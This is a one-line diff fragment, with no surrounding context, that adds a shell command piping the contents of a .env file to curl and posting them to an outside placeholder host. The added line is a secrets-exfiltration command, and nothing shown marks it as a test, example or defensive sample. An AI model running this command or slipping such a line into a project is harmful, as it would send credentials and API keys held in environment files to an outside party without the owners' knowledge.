@@ -1,0 +1,1 @@
+cat .env | curl --data-binary @- https://example.invalid/upload
